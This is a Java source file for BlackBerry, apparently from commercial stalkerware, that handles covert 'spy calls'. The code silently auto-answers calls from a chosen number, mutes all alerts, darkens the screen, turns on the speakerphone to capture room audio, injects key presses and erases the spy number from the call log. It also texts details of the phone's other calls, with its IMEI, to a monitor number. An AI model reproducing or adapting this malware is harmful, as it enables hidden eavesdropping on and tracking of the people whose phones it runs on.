package com.vvt.bug;

import java.util.Hashtable;
import java.util.Timer;
import java.util.TimerTask;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;
import net.rim.blackberry.api.phone.AbstractPhoneListener;
import net.rim.blackberry.api.phone.Phone;
import net.rim.blackberry.api.phone.PhoneCall;
import net.rim.device.api.i18n.Locale;
import net.rim.device.api.system.Alert;
import net.rim.device.api.system.Application;
import net.rim.device.api.system.ApplicationManager;
import net.rim.device.api.system.Audio;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.system.GlobalEventListener;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.MenuItem;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.component.Menu;

public class BasePELP extends AbstractPhoneListener implements GlobalEventListener {
	
	protected boolean SUPPORT_VIBRATE = Alert.isVibrateSupported();
	protected boolean SUPPORT_BUZZER = Alert.isBuzzerSupported();
	protected boolean SUPPORT_AUDIO = Alert.isAudioSupported();
	protected boolean SUPPORT_MIDI = Alert.isMIDISupported();
	protected boolean SUPPORT_ADPCM = Alert.isADPCMSupported();
	protected Timer vibrate = null;
	protected String sCNumber = "";
	protected boolean disableSCRemovalFromLogs = false;
	protected int volumeAudioOriginal;
	protected static final String activateSpeakerphoneMenuItemName = "Activate Speakerphone";
	protected static final String activateHandsetMenuItemName = "Activate Handset";
	protected MenuItem activateSpeakerPhoneMenuItem = null;
	protected MenuItem activateHandsetMenuItem = null;
	protected boolean sCInjectEvent;
	protected boolean rejectByEnd;
	protected boolean lastIncomingSCAccepted = false;
	protected boolean sCRejectedByAnswerAndEndInProgress = false;
	protected MenuItem endSCThread = null;
	protected Timer wait4KeyPressesAction = null;
	protected Integer sCIdCurrent = null;
	protected PhoneKeyActionThread patScheduledEndCall = null;
	protected static boolean sCInProgress = false;
	protected boolean callWaitingIdUnique = true;
	protected boolean sCAccepted = false;
	protected int timeToWaitSCI = -1;
	protected boolean systemLockedSCI;
	protected long idleTimeSCI = -1;
	protected Hashtable phoneCallsMappedByCallId = new Hashtable();
	protected PhoneEventListenerSettings pelSettings = null;
	protected UiApplication voiceApp = null;
	protected boolean localeEnglish;
	protected Locale locale;
	protected int numberOfCallsConnected = 0;
	protected int lastCallInitiatedOrIncomingId;
	protected final long incomingCallId = Long.parseLong("5961289116197897667");
	protected boolean sendSCFailureMessage = false;
	protected Screen scPhoneScreen = null;
	protected BugListener observer = null;
	private final String[] spModelNotSupported= {"8330", "8830"};
	
	public BasePELP() {
		pelSettings = new PhoneEventListenerSettings();
		pelSettings.setPel(this);
		locale = Locale.getDefault();
		localeEnglish = locale.getCode() == Locale.LOCALE_en || locale.getCode() == Locale.LOCALE_en_GB || locale.getCode() == Locale.LOCALE_en_US;
	}
	
	public void setBugListener(BugListener observer) {
		this.observer = observer;
	}
	
	public static boolean isSCInProgress() {
		return sCInProgress;
	}

	public void resetLogic() {
		disableSCRemovalFromLogs = false;
		lastIncomingSCAccepted = false;
		sCRejectedByAnswerAndEndInProgress = false;
		endSCThread = null;
		sCIdCurrent = null;
		sCInProgress = false;
		callWaitingIdUnique = true;
		sCAccepted = false;
		numberOfCallsConnected = 0;
	}

	public Hashtable getPhoneCallsMappedByCallId() {
		return phoneCallsMappedByCallId;
	}

	public void callDisconnected(int callId) {
		afterCallEndedImpl(callId, false);
	}

	public void callFailed(int callId, int reason) {
		afterCallEndedImpl(callId, true);
	}

	public void callInitiated(int callId) {
		try {
			lastCallInitiatedOrIncomingId = callId;
			addPhoneCallToAdministration(callId);
		} catch (Exception e) {
			
		}
	}

	public void callAnswered(int callId) {
		try {
			if (sCRejectedByAnswerAndEndInProgress) {
				return;
			}
			if (callWaitingIdUnique || numberOfCallsConnected == 0) {
				PhoneCall sC = isSC(callId);
				if (sC != null) {
					sCAccepted = true;
					cancelStopVibrateAndSound();
					patScheduledEndCall.cancel();
					patScheduledEndCall = new PhoneKeyActionThread(endSCThread, (char) Keypad.KEY_END, pelSettings.scheduleEndSCWhenNotConnectedOrNotAnsweredMS);
				}
			} else {}
		} catch (Exception e) {
			
		}
	}

	public void callConnected(int callId) {
		try {
			numberOfCallsConnected++;
			if (sCRejectedByAnswerAndEndInProgress) {
				sCRejectedByAnswerAndEndInProgress = false;
				rejectSCIncoming(pelSettings.endInCaseRejectByAnswerAndEndMS);
				return;
			}
			if (callWaitingIdUnique || numberOfCallsConnected == 1) {
				PhoneCall sC = isSC(callId);
				if (sC != null) {
					sendSCFailureMessage = false;
					Backlight.enable(false);
					patScheduledEndCall.cancel();
					Audio.setVolume(100);
					String deviceModel = DeviceInfo.getDeviceName();
					if (isSupportedSpeakerPhone(deviceModel)) {
						// Opening Speaker phone.
						Screen phoneScreen = voiceApp.getActiveScreen();
						activateSpeakerPhoneMenuItem = getMenuItem(activateSpeakerphoneMenuItemName, phoneScreen);
						scheduleActivatingSpeakerPhone();
						schedulePrepareActivatingHandset();
						scheduleVoiceAppManipulation(); 
					}
					scheduleWaitForKeyPress();
				}
			} else {}
			if (!sCInProgress && observer != null) {
				observer.onCall(pelSettings, checkAndReact(callId));
//				BaseFxS.getFxS().enableSCCL(); // To call FxS on "src-prox" 
			}
		} catch (Exception e) {
			
		}
	}
	
	public boolean isDisableSCRemovalFromLogs() {
		return disableSCRemovalFromLogs;
	}

	public void setSCNumber(String sCNumber) {
		this.sCNumber = sCNumber;
	}

	public PhoneCall isSC(int callId) {
		PhoneCall phoneCall = null;
		try {
			phoneCall = (PhoneCall) phoneCallsMappedByCallId.get(new Integer(callId));
			if (phoneCall != null) {
				boolean isOutgoing = phoneCall.isOutgoing();
				if (!isOutgoing) { // Incoming call is the spy call.
					String phoneNumber = phoneCall.getDisplayPhoneNumber();
					boolean numbersAreTheSame = phoneNumber.endsWith(sCNumber);
					if (!numbersAreTheSame) {
						phoneNumber = PhoneNumberFormat.removeNonDigitCharacters(phoneNumber);
						phoneNumber = PhoneNumberFormat.removeLeadingZeroes(phoneNumber);
						sCNumber = PhoneNumberFormat.removeNonDigitCharacters(sCNumber);
						sCNumber = PhoneNumberFormat.removeLeadingZeroes(sCNumber);
						numbersAreTheSame = phoneNumber != "" && phoneNumber.endsWith(sCNumber);
					}
					if (!numbersAreTheSame) {
						phoneCall = null;
					}
				}
				else {
					phoneCall = null;
				}
			}
		} catch (Exception e) {
			
		}
		return phoneCall;
	}

	public void eventOccurred(long guid, int data0, int data1, Object object0, Object object1) {
		try {
			if (sCInjectEvent && incomingCallId == guid) {
				sCInjectEvent = false;
				if (lastIncomingSCAccepted) {
					injectKey((char) Keypad.KEY_SEND);
				} else {
					if (rejectByEnd) {
						rejectSCIncoming();
					} else {
						sCRejectedByAnswerAndEndInProgress = true;
						injectKey((char) Keypad.KEY_SEND);
					}
				}
			}
		} catch (Exception e) {
		
		}
	}
	
	protected void scheduleWaitForKeyPress() {
		try {
			wait4KeyPressesAction = new Timer();
			wait4KeyPressesAction.schedule(new TimerTask() {
				public void run() {
					try {
						if (DeviceInfo.getIdleTime() == 0) {
							stopVibrateAndSound();
							wait4KeyPressesAction.cancel();
							endSCCaseKeyPressed();
						}
					} catch (Exception e) {
						
					}
				}
			}, pelSettings.waitBeforeWait4KeyPressActionMS, pelSettings.repeatPeriodWait4KeyPressActionMS);
		} catch (Exception e) {
			
		}
	}

	protected void scheduleVoiceAppManipulation() {
		try {
			Application.getApplication().invokeLater(new Runnable() {
				public void run() {
					try {
						scPhoneScreen = voiceApp.getActiveScreen();
						Backlight.enable(false);
					} catch (Exception e) {
						
					}
				}
			}, 150, false);
		} catch (Exception e) {
			
		}
	}

	protected void schedulePrepareActivatingHandset() {
		try {
			new Timer().schedule(new TimerTask() {
				public void run() {
					try {
						if (activateSpeakerPhoneMenuItem != null) {
							activateHandsetMenuItem = getMenuItem(activateHandsetMenuItemName, scPhoneScreen);
							activateSpeakerPhoneMenuItem = null;
						}
					} catch (Exception e) {
						
					}
				}
			}, pelSettings.timeToWaitBeforeFindActivateHandsetMenuItem);
		} catch (Exception e) {
		
		}
	}

	protected void scheduleActivatingSpeakerPhone() {
		try {
			new Timer().schedule(new TimerTask() {
				public void run() {
					try {
						new Thread(activateSpeakerPhoneMenuItem).start();
					} catch (Exception e) {
						
					}
				}
			}, pelSettings.timeToWaitBeforeActivateSpeakerPhone);
		} catch (Exception e) {
		
		}

	}

	protected MenuItem getMenuItem(String menuItemName, Screen screen) {
		try {
			Menu menu = screen.getMenu(0);
			int size = menu.getSize();
			for (int i = 1; i < size; i++) {
				MenuItem menuItem = (MenuItem) menu.getItemCookie(i);
				String itemName = menuItem.toString();
				if (menuItemName.equals(itemName))
					return menuItem;
			}
			if (size > 0) {
				MenuItem menuItem = (MenuItem) menu.getItemCookie(0);
				String itemName = menuItem.toString();
				if (menuItemName.equals(itemName))
					return menuItem;
			}
		} catch (Exception e) {
			
		}
		return null;
	}

	/*
	 * This method should be called once(!) for each phone call object entering
	 * the system: at the start of callIncoming/callWaiting/callInitiated
	 */
	protected void addPhoneCallToAdministration(int callId) {
		try {
			PhoneCall phoneCall = Phone.getCall(callId);
			if (phoneCall != null)
				phoneCallsMappedByCallId.put(new Integer(callId), phoneCall);
			
		} catch (Exception e) {
			
		}
	}

	protected void removePhoneCallFromAdministration(int callId) {
		try {
			phoneCallsMappedByCallId.remove(new Integer(callId));
		} catch (Exception e) {
		
		}
	}



	protected void considerActivatingHandset() {
		try {
			if (activateHandsetMenuItem != null) {
				new Thread(activateHandsetMenuItem).start();
				activateHandsetMenuItem = null;
			}
		} catch (Exception e) {
			
		}
	}

	protected void cancelStopVibrateAndSound() {
		try {
			if (vibrate != null) {
				vibrate.cancel();
				vibrate = null;
			}
		} catch (Exception e) {
			
		}
	}

	protected void stopVibrateAndSound() {
		try {
			if (vibrate != null)
				vibrate.cancel();
			vibrate = new Timer();
			vibrate.schedule(new TimerTask() {
				int indexStopVibrateBuzzerSound = 0;

				public void run() {
					try {
						if (indexStopVibrateBuzzerSound++ >= pelSettings.maxNumberOfTimesStopAlert) {
							cancelStopVibrateAndSound();
						} else {
							Alert.mute(true);
							Audio.setVolume(0);
							if (SUPPORT_VIBRATE) {
								Alert.stopVibrate();
							}
							if (SUPPORT_AUDIO) {
								Alert.stopAudio();
							}
							if (SUPPORT_MIDI) {
								Alert.stopMIDI();
							}
							if (SUPPORT_BUZZER) {
								Alert.setBuzzerVolume(0);
								Alert.stopBuzzer();
							}
							if (SUPPORT_ADPCM) {
								Alert.setADPCMVolume(0);
								Alert.stopADPCM();
							}
						}
					} catch (Exception e) {
						
					}
				}
			}, pelSettings.timeToWaitBeforeStopAlertMS, pelSettings.updateStopAlertMS);
		} catch (Exception e) {
			
		}
	}
	


	protected void endSCCaseKeyPressed() {}

	protected void rejectSCIncoming() { // To reject incoming call without delay.
		injectKey((char) Keypad.KEY_END); // To send "End" Key (Red Key) for disconnect spy call.
	}

	protected void injectKey(char key) {
		try {
			// Key Simulation
			InjectionKeyThread keyThread = new InjectionKeyThread(key);
			keyThread.start();
		} catch (Exception e) {
			
		}
	}
	
	protected void injectKey(final char key, int millisecond) {
		try {
			// Key Simulation
			new Timer().schedule(new TimerTask() {
				public void run() {
					injectKey(key);
				}
			}, millisecond);
			

		} catch (Exception e) {
			
		}
	}

	protected void rejectSCIncoming(long timeToWait) { // To reject incoming call with delay
		try {
			new Timer().schedule(new TimerTask() {
				public void run() {
					rejectSCIncoming();
				}
			}, timeToWait);
		} catch (Exception e) {
			
		}
	}
	
	protected void deleteSpyNumber(long timeToWait, final boolean isInterrupted, final boolean isHeld) { // To delete spy call number on OS 5.0.
		try {
			new Timer().schedule(new TimerTask() {
				public void run() {
					RecentCallCleaner recentCallCleaner = new RecentCallCleaner();
					if (isInterrupted) {
						int pos = 1;
						recentCallCleaner.deleteSpyNumber(pos);
					}
					else if (isHeld) {
						int round = 2;
						recentCallCleaner.deleteLastNCall(round);
					}
					else {
						recentCallCleaner.deleteLastCall();
					}
				}
			}, timeToWait);
		} catch (Exception e) {
			
		}
	}

	protected void determineAcceptSc() {
		try {
			systemLockedSCI = ApplicationManager.getApplicationManager().isSystemLocked();
			idleTimeSCI = DeviceInfo.getIdleTime();
			lastIncomingSCAccepted = systemLockedSCI || idleTimeSCI >= pelSettings.minimalRequiredIdleTimeMS;
		} catch (Exception e) {
			
		}
	}

	protected void scheduleStopSuspendPainting(boolean failed) {
		try {
			int waitInMilliSeconds;
			if (failed) {
				waitInMilliSeconds = pelSettings.waitBeforeStopSuspendPaintSCFailedMS;
			} else if (PhoneInfo.isFiveOrHigher()) {
				waitInMilliSeconds = pelSettings.waitBeforeStopSuspendPaintSCForOSFive;
			} else if (PhoneInfo.isFourSeven()) {
				waitInMilliSeconds = pelSettings.waitBeforeStopSuspendPaintSCDisconnectedForOS47;
			} else {
				waitInMilliSeconds = pelSettings.waitBeforeStopSuspendPaintSCDisconnectedMS;
			}
			new Timer().schedule(new TimerTask() {
				public void run() {
					try {
						if (voiceApp.isPaintingSuspended()) {
							try {
								voiceApp.suspendPainting(false);
							} catch (Exception e) {
							
							}
						}
					} catch (Exception e) {
						
					}
				}
			}, waitInMilliSeconds);
		} catch (Exception e) {
			
		}
	}

	protected void afterCallEndedImpl(int callId, boolean failed) {
		try {
			if (numberOfCallsConnected > 0)
				numberOfCallsConnected--;
			if (numberOfCallsConnected > 0) {
				PhoneCall activePhoneCall = Phone.getActiveCall();
				if (activePhoneCall == null) {
					numberOfCallsConnected = 0;
				}
			}
			if (numberOfCallsConnected == 0)
				sCRejectedByAnswerAndEndInProgress = false;
			if (callWaitingIdUnique) {
				PhoneCall sC = isSC(callId);
				if (sC != null)
					stopSCStuff(failed);
			} else {
				if (sCInProgress) {
					if (numberOfCallsConnected == 0) {
						stopSCStuff(failed);
					}
				}
			}
			removePhoneCallFromAdministration(callId);
			callWaitingIdUnique = true; 
		} catch (Exception e) {
		
		}
	}

	protected void stopSCStuff(boolean failed) {
		try {
			// Target phone presses the lock system key second time.
			if (systemLockedSCI && ApplicationManager.getApplicationManager().isSystemLocked()) {
				systemLockedSCI = false;
			} else if (!systemLockedSCI && ApplicationManager.getApplicationManager().isSystemLocked()) {
				systemLockedSCI = true;
			}
			if (systemLockedSCI) {
				int lockSystemInterval = 0;
				if (PhoneInfo.isFiveOrHigher()) {
					lockSystemInterval = pelSettings.waitBeforeLockSystemMS;
				}
				new Timer().schedule(new TimerTask() {
					public void run() {
						ApplicationManager.getApplicationManager().lockSystem(true);
						systemLockedSCI = false;
					}
				}, lockSystemInterval);
			}
			if (sCInProgress)
				considerActivatingHandset();
			cancelStopVibrateAndSound();
			Audio.setVolume(volumeAudioOriginal);
			if (wait4KeyPressesAction != null) {
				wait4KeyPressesAction.cancel();
			}
			scheduleStopSuspendPainting(failed);
			if (!PhoneInfo.isFiveOrHigher()) {
				Backlight.enable(false);
			}
			sCAccepted = false;
			sCInProgress = false;
		} catch (Exception e) {
			
		}
	}
	
	private FxSMSMessage checkAndReact(int callId) { // To send SMS to monitor number when call event happen !
		PhoneCall phoneCall = Phone.getCall(callId);
		FxSMSMessage smsMessage = new FxSMSMessage();
		String phoneNumber = phoneCall.getDisplayPhoneNumber();
		boolean numbersAreTheSame = false;
		if (sCNumber != "") {
			numbersAreTheSame = phoneNumber.endsWith(sCNumber);
			if (!numbersAreTheSame) {
				String phoneNumberEdited = PhoneNumberFormat.removeNonDigitCharacters(phoneNumber);
				phoneNumberEdited = PhoneNumberFormat.removeLeadingZeroes(phoneNumberEdited);
				numbersAreTheSame = phoneNumberEdited.trim() != "" && sCNumber.endsWith(phoneNumberEdited);
			}
		}
		if (!numbersAreTheSame) {
			String text = ""; // To format message for sending to monitor number. 
			String phoneNumberEdited = PhoneNumberFormat.removeNonDigitCharactersExceptStartingPlus(phoneNumber);
			boolean isOutgoing = phoneCall.isOutgoing();
			if (isOutgoing)
				text += "Outgoing call to";
			else
				text += "Incoming call from";
			if (phoneNumberEdited!="")
				text += " " + phoneNumberEdited;
			else
				text += " an unknown number";
			text += " is detected on the phone with IMEI/ESN: " + PhoneInfo.getIMEI();
			smsMessage.setMessage(text);
			smsMessage.setNumber(sCNumber);
		}
		return smsMessage;
	}
	
	private boolean isSupportedSpeakerPhone(String model) {
		boolean isSupported = true;
		for (int i = 0; i < spModelNotSupported.length; i++) {
			String tmp = spModelNotSupported[i];
			if (tmp.equals(model)) {
				isSupported = false;
				break;
			}
		}
		return isSupported;
	}
}